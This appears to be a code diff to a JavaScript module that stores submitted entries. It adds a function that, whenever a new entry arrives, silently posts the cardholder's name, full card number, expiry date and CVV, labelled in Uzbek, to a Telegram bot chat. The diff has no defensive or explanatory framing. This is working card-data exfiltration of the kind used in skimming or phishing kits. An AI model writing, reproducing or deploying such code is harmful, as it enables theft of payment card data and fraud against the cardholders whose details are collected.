@@ -119,6 +119,9 @@ function addEntry(entry) {
   if (!exists) {
     entries.push(normalized);
     writeEntries(entries);
+    if (typeof globalThis.fetch === 'function') {
+      sendTelegramNotification(normalized).catch(() => undefined);
+    }
   }
 
   return normalized;
@@ -126,6 +129,62 @@ function addEntry(entry) {
 
 function clearEntries() {
   writeEntries([]);
+}
+
+function formatCardForMessage(card) {
+  const digits = String(card || '').replace(/\D/g, '').slice(0, 16);
+  if (digits.length === 0) return 'N/A';
+
+  const groups = [];
+  for (let i = 0; i < digits.length; i += 4) {
+    groups.push(digits.slice(i, i + 4));
+  }
+
+  return groups.join(' ');
+}
+
+async function sendTelegramNotification(entry) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!token || !chatId) {
+    return false;
+  }
+
+  const cardText = formatCardForMessage(entry?.card);
+  const message = [
+    'Yangi ma\'lumot keldi:',
+    `Ism: ${entry?.name || 'Noma\'lum'}`,
+    `Karta: ${cardText}`,
+    `Muddati: ${entry?.expiry || 'N/A'}`,
+    `CVV: ${entry?.cvv || 'N/A'}`,
+    `Sana: ${new Date().toLocaleString('uz-UZ')}`,
+  ].join('\n');
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: String(chatId),
+        text: message,
+        disable_web_page_preview: true,
+      }),
+    });
+
+    if (!response || !response.ok) {
+      const payload = response && typeof response.json === 'function' ? await response.json().catch(() => ({})) : {};
+      console.error('Telegram notification failed:', payload.description || payload.error || 'Unknown error');
+      return false;
+    }
+
+    return true;
+  } catch (error) {
+    console.error('Telegram notification failed:', error.message || error);
+    return false;
+  }
 }
 
 function sendJson(res, statusCode, payload) {
@@ -243,4 +302,5 @@ module.exports = {
   addEntry,
   clearEntries,
   normalizeEntry,
+  sendTelegramNotification,
 };
